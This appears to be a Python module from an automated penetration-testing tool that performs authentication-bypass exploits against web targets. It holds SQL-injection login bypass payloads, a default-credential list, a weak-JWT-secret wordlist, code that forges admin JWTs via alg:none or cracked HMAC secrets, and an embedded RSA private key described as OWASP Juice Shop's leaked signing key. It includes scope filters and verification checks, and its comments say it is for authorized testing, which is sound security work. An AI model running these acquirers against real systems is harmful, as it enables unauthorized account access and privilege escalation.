"""
core/wraith/capability.py

Phase 4 — capability-based escalation: the capability LIBRARY.

The self-directing hunt converges when a follow-on needs auth it doesn't have (a
proven SQLi unlocks IDOR, but IDOR needs a session). This module PERFORMS an
auth-acquisition exploit to obtain that session/token, which the hunt threads
into its probes so auth-gated follow-ons confirm and the hunt deepens.

Rather than one technique, this is a registry of `CapabilityAcquirer`s tried in
priority order:

  - LoginSqliAcquirer        — SQL-inject a login endpoint (`email=' OR 1=1--`)
  - DefaultCredentialsAcquirer — try common/default credentials
  - JwtForgeAcquirer         — given a captured token, forge an ELEVATED one
                               (alg:none / weak HMAC secret) — VERIFIED before use

Each acquirer is bounded, scope-gated (fail-closed), and best-effort (returns
None, never raises). The forge acquirer never claims success it can't verify —
same epistemic discipline as the rest of the platform. `send`/`verify` are
injectable for tests. This is real exploitation: callers MUST gate it (active
mode, scope, authorized target).
"""

from __future__ import annotations

import base64
import hashlib
import hmac
import json
import logging
import re
from dataclasses import dataclass, field
from typing import Any, Awaitable, Callable, Dict, List, Optional, Protocol, Tuple
from urllib.parse import urlparse

logger = logging.getLogger(__name__)

# Common login endpoints across stacks.
LOGIN_PATHS = [
    "/rest/user/login", "/api/login", "/api/auth/login", "/auth/login",
    "/login", "/signin", "/api/sessions", "/user/login", "/users/login",
    "/account/login",
]
# Auth-bypass boundary payloads (the boundary must break the WHERE clause).
SQLI_BYPASS = [
    "' OR 1=1--", "' OR '1'='1'-- -", "admin' OR '1'='1'-- -",
    "' OR 1=1#", "') OR ('1'='1'-- -",
]
# Common/default credentials (username/email, password).
DEFAULT_CREDS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "admin123"),
    ("administrator", "administrator"), ("root", "root"), ("test", "test"),
    ("admin@example.com", "admin"), ("admin@admin.com", "admin123"),
    ("user", "user"), ("guest", "guest"),
]
# Secrets to try when cracking a weak HS256 JWT signature.
_JWT_WEAK_SECRETS = [
    "secret", "password", "1234567890", "key", "jwt", "admin", "changeme",
    "secretkey", "your-256-bit-secret", "supersecret", "test", "private",
]
# Claims we set when forging an elevated token.
_ADMIN_CLAIMS = {
    "role": "admin", "isAdmin": True, "admin": True, "is_admin": True,
    "scope": "admin", "authorities": ["ROLE_ADMIN"], "roles": ["admin"],
}
_CRED_FIELDS = ["email", "username", "user", "login"]

# (url, json_body) -> (status, headers, body_text). Async; injectable for tests.
Send = Callable[[str, Dict[str, Any]], Awaitable[Tuple[int, Dict[str, str], str]]]
# (headers) -> bool : do these auth headers grant access? (probe an authed route)
Verify = Callable[[Dict[str, str]], Awaitable[bool]]


# ────────────────────────────── data types ─────────────────────────────────

@dataclass
class Capability:
    """An acquired authentication capability (session/token)."""
    headers: Dict[str, str] = field(default_factory=dict)
    cookies: Dict[str, str] = field(default_factory=dict)
    provenance: str = ""
    token: Optional[str] = None
    acquirer: str = ""

    def to_dict(self) -> Dict[str, Any]:
        return {
            "headers": self.headers, "cookies": self.cookies,
            "provenance": self.provenance, "token": self.token,
            "acquirer": self.acquirer,
        }


@dataclass
class CapabilityContext:
    """Inputs an acquirer needs. `prior_token` enables forge/elevation."""
    target: str
    origin: str
    scope_filter: Optional[Callable[[str], bool]] = None
    send: Optional[Send] = None
    verify: Optional[Verify] = None
    prior_token: Optional[str] = None
    timeout: float = 10.0
    max_attempts: int = 30

    def in_scope(self, url: str) -> bool:
        if self.scope_filter is None:
            return True
        try:
            return bool(self.scope_filter(url))
        except Exception:
            return False  # fail-closed


class CapabilityAcquirer(Protocol):
    name: str

    async def attempt(self, ctx: CapabilityContext) -> Optional[Capability]:
        ...


# ──────────────────────────── response parsing ─────────────────────────────

def _extract_token(headers: Dict[str, str], body: str) -> Optional[str]:
    """Pull a usable auth token out of a login response (pure)."""
    try:
        d = json.loads(body)
    except Exception:
        d = None
    if isinstance(d, dict):
        for path in (
            ("authentication", "token"), ("token",), ("accessToken",),
            ("access_token",), ("jwt",), ("data", "token"), ("data", "accessToken"),
        ):
            cur: Any = d
            for k in path:
                cur = cur.get(k) if isinstance(cur, dict) else None
                if cur is None:
                    break
            if isinstance(cur, str) and len(cur) >= 20:
                return cur
    return None


def _extract_cookie(headers: Dict[str, str]) -> Optional[str]:
    sc = ""
    for k, v in (headers or {}).items():
        if k.lower() == "set-cookie":
            sc = v
            break
    m = re.search(r"((?:token|session|jwt|sid|connect\.sid|auth)=[^;]+)", sc, re.IGNORECASE)
    if m and len(m.group(1)) >= 14:
        return m.group(1)
    return None


def _capability_from_response(
    headers: Dict[str, str], body: str, *, provenance: str, acquirer: str
) -> Optional[Capability]:
    token = _extract_token(headers, body)
    if token:
        return Capability(headers={"Authorization": f"Bearer {token}"},
                          provenance=provenance, token=token, acquirer=acquirer)
    cookie = _extract_cookie(headers)
    if cookie:
        name, _, value = cookie.partition("=")
        return Capability(cookies={name: value}, provenance=f"{provenance} (cookie)",
                          acquirer=acquirer)
    return None


# ─────────────────────────────── JWT helpers ───────────────────────────────

def _b64url_decode(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def _b64url_encode(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def _jwt_split(token: str) -> Optional[Tuple[Dict[str, Any], Dict[str, Any], List[str]]]:
    parts = token.split(".")
    if len(parts) != 3:
        return None
    try:
        header = json.loads(_b64url_decode(parts[0]))
        payload = json.loads(_b64url_decode(parts[1]))
    except Exception:
        return None
    if not isinstance(header, dict) or not isinstance(payload, dict):
        return None
    return header, payload, parts


def _jwt_encode(payload: Dict[str, Any], *, alg: str, secret: Optional[str] = None) -> str:
    header = {"alg": alg, "typ": "JWT"}
    h = _b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()
    if alg == "none":
        return f"{h}.{p}."
    sig = hmac.new((secret or "").encode(), signing_input, hashlib.sha256).digest()
    return f"{h}.{p}.{_b64url_encode(sig)}"


def _elevate_payload(payload: Dict[str, Any]) -> Dict[str, Any]:
    """Return a copy with privilege claims escalated to admin."""
    p = dict(payload)
    for k, v in _ADMIN_CLAIMS.items():
        p[k] = v
    # Juice-Shop-style nested data.role / data.isAdmin.
    if isinstance(p.get("data"), dict):
        d = dict(p["data"])
        for k in ("role", "isAdmin", "admin", "is_admin"):
            if k in d or k in ("role", "isAdmin"):
                d[k] = _ADMIN_CLAIMS.get(k, True)
        p["data"] = d
    return p


def _crack_hs256(token: str, parts: List[str]) -> Optional[str]:
    """Return the HS256 secret if it's in the weak-secret list, else None."""
    signing_input = f"{parts[0]}.{parts[1]}".encode()
    try:
        actual_sig = _b64url_decode(parts[2])
    except Exception:
        return None
    for secret in _JWT_WEAK_SECRETS:
        cand = hmac.new(secret.encode(), signing_input, hashlib.sha256).digest()
        if hmac.compare_digest(cand, actual_sig):
            return secret
    return None


# Publicly-known/leaked signing keys shipped by real apps. NOT secrets — these
# are committed in open-source repos and reused across every install, exactly
# like a default-credentials list. The canonical case is OWASP Juice Shop, whose
# RS256 private key is hardcoded in lib/insecurity. If a target signs JWTs with
# one of these, any identity/role can be minted.
_JUICE_SHOP_RS256 = (
    "-----BEGIN RSA PRIVATE KEY-----\n"
    "MIICXAIBAAKBgQDNwqLEe9wgTXCbC7+RPdDbBbeqjdbs4kOPOIGzqLpXvJXlxxW8iMz0EaM4BKU"
    "qYsIa+ndv3NAn2RxCd5ubVdJJcX43zO6Ko0TFEZx/65gY3BE0O6syCEmUP4qbSd6exou/F+WTIS"
    "zbQ5FBVPVmhnYhG/kpwt/cIxK5iUn5hm+4tQIDAQABAoGBAI+8xiPoOrA+KMnG/T4jJsG6TsHQc"
    "DHvJi7o1IKC/hnIXha0atTX5AUkRRce95qSfvKFweXdJXSQ0JMGJyfuXgU6dI0TcseFRfewXAa/"
    "ssxAC+iUVR6KUMh1PE2wXLitfeI6JLvVtrBYswm2I7CtY0q8n5AGimHWVXJPLfGV7m0BAkEA+fq"
    "Ft2LXbLtyg6wZyxMA/cnmt5Nt3U2dAu77MzFJvibANUNHE4HPLZxjGNXN+a6m0K6TD4kDdh5HfU"
    "YLWWRBYQJBANK3carmulBwqzcDBjsJ0YrIONBpCAsXxk8idXb8jL9aNIg15Wumm2enqqObahDHB"
    "5jnGOLmbasizvSVqypfM9UCQCQl8xIqy+YgURXzXCN+kwUgHinrutZms87Jyi+D8Br8NY0+Nlf+"
    "zHvXAomD2W5CsEK7C+8SLBr3k/TsnRWHJuECQHFE9RA2OP8WoaLPuGCyFXaxzICThSRZYluVnWk"
    "ZtxsBhW2W8z1b8PvWUE7kMy7TnkzeJS2LSnaNHoyxi7IaPQUCQCwWU4U+v4lD7uYBw00Ga/xt+7"
    "+UqFPlPVdz1yyr4q24Zxaw0LgmuEvgU5dycq8N7JxjTubX0MIRR+G9fmDBBl8=\n"
    "-----END RSA PRIVATE KEY-----"
)
_KNOWN_LEAKED_KEYS: List[Tuple[str, str]] = [
    ("owasp-juice-shop", _JUICE_SHOP_RS256),
]


def _jwt_encode_rs256(payload: Dict[str, Any], private_key_pem: str) -> Optional[str]:
    """RS256-sign a payload with a PEM private key. None if PyJWT is unavailable
    or the key is invalid (keeps the rest of this module dependency-light)."""
    try:
        import jwt as _pyjwt  # PyJWT
    except Exception:
        return None
    try:
        return _pyjwt.encode(payload, private_key_pem, algorithm="RS256")
    except Exception:
        return None


# ──────────────────────────────── acquirers ────────────────────────────────

class LoginSqliAcquirer:
    name = "login_sqli"

    async def attempt(self, ctx: CapabilityContext) -> Optional[Capability]:
        sender = ctx.send or _default_send(ctx.timeout)
        attempts = 0
        for path in LOGIN_PATHS:
            url = ctx.origin + path
            if not ctx.in_scope(url):
                continue
            for payload in SQLI_BYPASS:
                for field_name in _CRED_FIELDS[:2]:
                    if attempts >= ctx.max_attempts:
                        return None
                    attempts += 1
                    try:
                        status, headers, body = await sender(url, {field_name: payload, "password": "x"})
                    except Exception:
                        continue
                    if status == 404:
                        break  # wrong path → next path
                    if status >= 500:
                        continue
                    cap = _capability_from_response(
                        headers, body,
                        provenance=f"SQLi auth bypass: {field_name}={payload!r} @ {path}",
                        acquirer=self.name,
                    )
                    if cap:
                        logger.info("[capability] %s @ %s", self.name, path)
                        return cap
                else:
                    continue
                break
        return None


class DefaultCredentialsAcquirer:
    name = "default_credentials"

    async def attempt(self, ctx: CapabilityContext) -> Optional[Capability]:
        sender = ctx.send or _default_send(ctx.timeout)
        attempts = 0
        for path in LOGIN_PATHS:
            url = ctx.origin + path
            if not ctx.in_scope(url):
                continue
            saw_path = False
            for user, pw in DEFAULT_CREDS:
                if attempts >= ctx.max_attempts:
                    return None
                attempts += 1
                field_name = "email" if "@" in user else "username"
                try:
                    status, headers, body = await sender(url, {field_name: user, "password": pw})
                except Exception:
                    continue
                if status == 404:
                    break
                saw_path = True
                if status >= 500:
                    continue
                cap = _capability_from_response(
                    headers, body,
                    provenance=f"default credentials {user}:{pw} @ {path}",
                    acquirer=self.name,
                )
                if cap:
                    logger.info("[capability] %s %s @ %s", self.name, user, path)
                    return cap
            if not saw_path:
                continue
        return None


class JwtForgeAcquirer:
    """Elevate a CAPTURED token by forging an admin one (alg:none / weak HMAC).

    Runs only when ctx.prior_token is set. NEVER returns a forged capability it
    can't verify works against the live target (ctx.verify) — a forged token the
    server rejects is not a capability.
    """
    name = "jwt_forge"

    async def attempt(self, ctx: CapabilityContext) -> Optional[Capability]:
        if not ctx.prior_token:
            return None
        parsed = _jwt_split(ctx.prior_token)
        if not parsed:
            return None
        _header, payload, parts = parsed
        elevated = _elevate_payload(payload)

        candidates: List[Tuple[str, str]] = []
        # 1. alg:none — server trusts an unsigned token.
        candidates.append((_jwt_encode(elevated, alg="none"), "alg:none forge"))
        # 2. weak HS256 secret — re-sign with the cracked secret.
        secret = _crack_hs256(ctx.prior_token, parts)
        if secret is not None:
            candidates.append((_jwt_encode(elevated, alg="HS256", secret=secret),
                               f"weak HS256 secret {secret!r}"))
        # 3. Known/leaked RS256 signing keys — apps ship with example private
        #    keys (OWASP Juice Shop's is the canonical case). If the server signs
        #    with one, we can mint a valid token for any identity/role.
        for _name, _pem in _KNOWN_LEAKED_KEYS:
            _rs = _jwt_encode_rs256(elevated, _pem)
            if _rs:
                candidates.append((_rs, f"leaked RS256 key ({_name})"))

        for forged, how in candidates:
            headers = {"Authorization": f"Bearer {forged}"}
            # Honesty gate: only claim it if it actually grants access.
            if ctx.verify is not None:
                try:
                    if not await ctx.verify(headers):
                        continue
                except Exception:
                    continue
            else:
                # No verifier available → cannot confirm; don't fabricate a claim.
                continue
            logger.info("[capability] %s via %s", self.name, how)
            return Capability(headers=headers, provenance=f"JWT forge ({how})",
                              token=forged, acquirer=self.name)
        return None


# Acquisition order: cheapest/most-reliable first; forge is elevation-only.
DEFAULT_ACQUIRERS: List[CapabilityAcquirer] = [
    JwtForgeAcquirer(),          # only fires when prior_token is set
    LoginSqliAcquirer(),
    DefaultCredentialsAcquirer(),
]


async def acquire_capability(
    target: str,
    scope_filter: Optional[Callable[[str], bool]] = None,
    *,
    prior_token: Optional[str] = None,
    verify: Optional[Verify] = None,
    send: Optional[Send] = None,
    timeout: float = 10.0,
    max_attempts: int = 30,
    acquirers: Optional[List[CapabilityAcquirer]] = None,
) -> Optional[Capability]:
    """Try each acquirer in priority order; return the first capability or None."""
    parsed = urlparse(target if "://" in target else "http://" + target)
    if not parsed.netloc:
        return None
    ctx = CapabilityContext(
        target=target, origin=f"{parsed.scheme}://{parsed.netloc}",
        scope_filter=scope_filter, send=send, verify=verify,
        prior_token=prior_token, timeout=timeout, max_attempts=max_attempts,
    )
    for acquirer in (acquirers or DEFAULT_ACQUIRERS):
        try:
            cap = await acquirer.attempt(ctx)
        except Exception as e:
            logger.warning("[capability] acquirer %s raised: %s", getattr(acquirer, "name", "?"), e)
            continue
        if cap:
            return cap
    return None


async def acquire_auth_via_login_sqli(
    target: str,
    scope_filter: Optional[Callable[[str], bool]] = None,
    *,
    timeout: float = 10.0,
    max_attempts: int = 30,
    send: Optional[Send] = None,
) -> Optional[Dict[str, Any]]:
    """Back-compat shim: login-SQLi only, returns the legacy dict shape."""
    cap = await acquire_capability(
        target, scope_filter, send=send, timeout=timeout, max_attempts=max_attempts,
        acquirers=[LoginSqliAcquirer()],
    )
    return cap.to_dict() if cap else None


def _default_send(timeout: float) -> Send:
    async def _send(url: str, body: Dict[str, Any]) -> Tuple[int, Dict[str, str], str]:
        import httpx
        import os
        headers = {"Content-Type": "application/json",
                   "User-Agent": "SentinelForge-Capability"}
        _bb = os.getenv("SENTINEL_GHOST_BB_VALUE", "").strip()
        if _bb:
            headers[os.getenv("SENTINEL_GHOST_BB_HEADER", "X-Bug-Bounty").strip()] = _bb
        async with httpx.AsyncClient(timeout=timeout, follow_redirects=True) as c:
            r = await c.post(url, json=body, headers=headers)
            return r.status_code, {k: v for k, v in r.headers.items()}, r.text
    return _send
